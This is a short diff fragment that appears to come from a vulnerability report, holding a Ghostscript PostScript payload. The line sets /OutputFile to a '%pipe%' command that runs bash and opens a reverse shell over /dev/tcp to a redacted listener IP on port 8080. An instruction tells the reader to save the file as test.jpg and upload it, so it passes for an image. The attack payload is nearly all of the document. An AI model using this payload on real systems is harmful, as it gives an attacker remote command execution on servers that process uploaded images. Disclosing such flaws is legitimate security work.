@@ -5,4 +5,9 @@ legal
 legal
 mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
 
+
+-----------------------------------------------------------------
+
+█████ is the IP of my listener)
+
 ---------save it as test.jpg format to upload it-----------------
